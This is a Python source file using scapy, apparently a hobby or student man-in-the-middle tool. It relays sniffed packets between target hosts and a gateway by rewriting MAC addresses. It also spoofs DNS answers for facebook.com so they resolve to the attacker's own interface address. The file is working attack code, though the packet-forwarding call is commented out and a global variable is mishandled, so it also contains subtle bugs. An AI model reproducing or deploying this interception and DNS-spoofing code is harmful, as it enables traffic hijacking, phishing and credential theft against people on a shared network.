from scapy.all import *

ifname = None
targets_MAC = None
gateway_MAC = None
ifname = None
targets = None
target_MAC_mapper = {}
my_addr = None

def handle_packet(pkt):
    try:

        if not pkt.haslayer(IP):
            return

        if pkt[0].dst == "ff:ff:ff:ff:ff:ff":
            return

        if pkt[0].src in targets_MAC:
            pkt[0].dst = gateway_MAC

        elif pkt[IP].dst in targets:
            if pkt[IP].dst not in target_MAC_mapper:
                return
            pkt[0].dst = target_MAC_mapper[pkt[IP].dst]

        else:
            return

        print(pkt[IP].ttl)
        #print("Source before:")
        #print(pkt[0].src)
        #print(pkt[IP].src)
        #print("Dest before:")
        #print(pkt[0].dst)
        #print(pkt[IP].dst)

        pkt[0].src = my_addr

        if pkt.haslayer(DNS):
            qname = pkt[DNS].an.rrname.decode("utf-8")
            print(qname)
            if qname == "www.facebook.com." or qname == "www.facebook.com" or qname == "facebook.com." or qname == "facebook.com":
                pkt[DNS].an.rdata = get_if_addr(ifname)
                print("dnssssssssssssssssssss")
                pkt.show()
                #exit()

        #pkt.show()
        #print("Source After:")
        #print(pkt[0].src)
        #print(pkt[IP].src)
        #print("Dest After:")
        #print(pkt[0].dst)
        #print(pkt[IP].dst)
        #print("""\n\n\n""")
        #sendp(pkt, verbose=False)
    
    except Exception:
        return


def StartMITM(_targets, _targets_MAC, _gateway_MAC, _ifname):
    global targets, targets_MAC, ifname, target_MAC_mapper, my_addr

    targets = _targets
    targets_MAC = _targets_MAC
    ifname = _ifname
    gateway_MAC = _gateway_MAC

    for i, target in enumerate(targets):
        target_MAC_mapper[target] = targets_MAC[i]
    my_addr = get_if_hwaddr(ifname)

    filter_ = ""
    if targets:
        for t in targets:
            if len(filter_) > 0:
                filter_ += " and host " + t
            else:
                filter_ += "host " + t
    sniff(filter=filter_, prn=handle_packet, iface=ifname)
